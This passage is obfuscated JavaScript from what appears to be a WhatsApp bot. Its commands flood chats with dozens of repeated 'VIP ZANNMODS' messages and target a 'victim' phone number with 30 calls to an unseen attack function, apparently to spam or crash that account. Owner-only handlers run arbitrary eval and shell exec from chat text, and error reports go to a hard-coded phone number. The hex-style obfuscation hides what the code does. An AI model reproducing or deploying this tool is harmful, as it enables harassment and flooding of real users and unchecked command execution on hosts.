              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            {
              text: '\uD83D\uDE80\uD835\uDC15\uD835\uDC08\uD835\uDC0F \uD835\uDC19\uD835\uDC00\uD835\uDC0D\uD835\uDC0D\uD835\uDC0C\uD835\uDC0E\uD835\uDC03\uD835\uDC12\uD83D\uDE80',
            },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf.sendMessage(
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            Pe,
            { text: _0x28e58e(668) },
            { quoted: _0x568a08 }
          )
          await sleep(2000)
          _0x40c8bf[_0x28e58e(351)](
            _0x209768,
            { text: _0x28e58e(426) + _0x17ba71 + _0x28e58e(376) },
            { quoted: _0x37c453 }
          )
        }
        break
      case _0x28e58e(459):
        {
          if (!_0x24eb5a) {
            return _0x303d1f('KHUSUS OWNER')
          }
          if (!_0x41aad1[0]) {
            return _0x303d1f(
              _0x28e58e(413) +
                (_0x2d9e85 + _0x17ba71) +
                _0x28e58e(572) +
                (_0x2d9e85 + _0x17ba71) +
                _0x28e58e(584)
            )
          }
          victim = _0x3807e2[_0x28e58e(436)]('|')[0] + _0x28e58e(360)
          amount = '30'
          for (let _0x233fa7 = 0; _0x233fa7 < amount; _0x233fa7++) {
            _0xa493f7(_0x26a6ce, victim)
            await sleep(3000)
          }
          _0x303d1f(_0x28e58e(726) + victim + _0x28e58e(532))
        }
        break
      case 'addprem':
        if (!_0x24eb5a) {
          return
        }
        if (!_0x41aad1[0]) {
          return _0x303d1f(
            _0x28e58e(503) +
              (_0x2d9e85 + _0x17ba71) +
              _0x28e58e(548) +
              (_0x2d9e85 + _0x17ba71) +
              _0x28e58e(399)
          )
        }
        bnnd = _0x3807e2[_0x28e58e(436)]('|')[0].replace(/[^0-9]/g, '')
        if (_0x285852[_0x28e58e(702)] == 0) {
          return _0x303d1f(_0x28e58e(349))
        }
        owner.push(bnnd),
          fs[_0x28e58e(316)]('./premium.json', JSON[_0x28e58e(603)](owner)),
          _0x303d1f(_0x28e58e(601) + bnnd + _0x28e58e(519))
        break
      case _0x28e58e(425):
        if (!_0x24eb5a) {
          return
        }
        if (!_0x41aad1[0]) {
          return _0x303d1f(
            _0x28e58e(503) +
              (_0x2d9e85 + _0x17ba71) +
              _0x28e58e(548) +
              (_0x2d9e85 + _0x17ba71) +
              _0x28e58e(416)
          )
        }
        ;(yaki = _0x3807e2.split('|')[0][_0x28e58e(331)](/[^0-9]/g, '')),
          (unp = owner[_0x28e58e(595)](yaki)),
          owner[_0x28e58e(473)](unp, 1),
          fs[_0x28e58e(316)]('./premium.json', JSON[_0x28e58e(603)](owner)),
          _0x303d1f('Nomor ' + yaki + _0x28e58e(643))
        break
      case _0x28e58e(757):
        {
          _0x40c8bf[_0x28e58e(351)](_0x30af8e[_0x28e58e(568)], {
            delete: {
              remoteJid: _0x30af8e[_0x28e58e(568)],
              fromMe: true,
              id: _0x30af8e.quoted.id,
              participant: _0x30af8e[_0x28e58e(384)][_0x28e58e(475)],
            },
          })
        }
        break
      default:
        if (_0x614e5c[_0x28e58e(451)]('=>')) {
          if (!_0x24eb5a) {
            return _0x303d1f(_0x28e58e(542))
          }
          function _0x2264d3(_0xccd783) {
            const _0x54bd5d = _0x28e58e
            return (
              (sat = JSON[_0x54bd5d(603)](_0xccd783, null, 2)),
              (bang = util.format(sat)),
              sat == undefined && (bang = util.format(_0xccd783)),
              _0x303d1f(bang)
            )
          }
          try {
            _0x303d1f(
              util.format(
                eval(
                  _0x28e58e(543) + _0x614e5c[_0x28e58e(428)](3) + _0x28e58e(327)
                )
              )
            )
          } catch (_0x3984c5) {
            _0x303d1f(String(_0x3984c5))
          }
        }
        if (_0x614e5c[_0x28e58e(451)]('>')) {
          if (!_0x24eb5a) {
            return _0x303d1f(_0x28e58e(542))
          }
          try {
            if (typeof _0x231817 !== 'string') {
              _0x231817 = require('util')[_0x28e58e(497)](_0x231817)
            }
            await _0x303d1f(_0x231817)
          } catch (_0x3e2582) {
            await _0x303d1f(String(_0x3e2582))
          }
        }
        if (_0x614e5c[_0x28e58e(451)]('$')) {
          if (!_0x24eb5a) {
            return _0x303d1f(_0x28e58e(542))
          }
          exec(_0x614e5c.slice(2), (_0x124dc9, _0x35ae29) => {
            if (_0x124dc9) {
              return _0x303d1f(_0x124dc9)
            }
            if (_0x35ae29) {
              return _0x303d1f(_0x35ae29)
            }
          })
        }
        if (_0x3acce3 && _0x614e5c[_0x28e58e(504)]() != undefined) {
          if (_0x30af8e[_0x28e58e(743)]) {
            return
          }
          if (_0x209768[_0x28e58e(670)](_0x28e58e(586))) {
            return
          }
          if (!(_0x614e5c.toLowerCase() in _0x1bcecc)) {
            return
          }
          _0x40c8bf[_0x28e58e(651)](
            _0x209768,
            _0x1bcecc[_0x614e5c[_0x28e58e(504)]()],
            true
          )
        }
    }
  } catch (_0x46e0e5) {
    console[_0x28e58e(709)](util[_0x28e58e(655)](_0x46e0e5))
    let _0x4ffb3d = String(_0x46e0e5)
    _0x40c8bf.sendMessage('6283153305709' + _0x28e58e(360), {
      text: _0x28e58e(422) + util[_0x28e58e(655)](_0x4ffb3d),
      contextInfo: {
        forwardingScore: 9999999,
        isForwarded: true,
      },
    })
  }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright('Update ' + __filename))
  delete require.cache[file]
  require(file)
})
